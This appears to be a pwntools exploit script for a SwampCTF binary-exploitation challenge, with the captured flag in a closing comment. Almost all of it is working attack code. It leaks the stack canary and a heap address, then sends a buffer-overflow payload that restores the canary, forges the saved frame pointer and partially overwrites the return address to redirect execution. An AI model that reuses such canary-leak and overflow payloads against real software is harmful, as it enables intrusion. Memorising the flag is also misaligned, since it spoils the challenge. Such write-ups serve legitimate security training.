from pwn import *

e = ELF("./binary")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)


p = remote("chals.swampctf.com", 40005)
#p = process("./binary")

script = '''
set detach-on-fork off
b *0x4013A7
b *reg + 163
b *0x4014B8
b *0x401407
'''

#p = gdb.debug("./binary", gdbscript = script)

# leak canary && stack
p_sla(b"> ", b"2")
p_sla(b"username: ", b"100")
p_sa(b"Username: ", b"vani")
p_recvut(b"find the user: ")
p.recv(0x18)
canary = u64(p.recv(8))
p.recv(0x20)
heap_base = u64(p.recv(8)) - 0x2a0
print(hex(canary), hex(heap_base))

# ret2 fputs (weird behaviour about buffer stdout)
p_sla(b"> ", b"1")
p_sa(b"Username: ", b"vani")
payload = b"A" * 0x18 + p64(canary) + p64(heap_base + 0x690 - 0x20) + p16(0x145A)
p_sa(b"Password: ", payload)

p.interactive()
#swampCTF{fUn_w1tH_f0rk5_aN6_fd5}
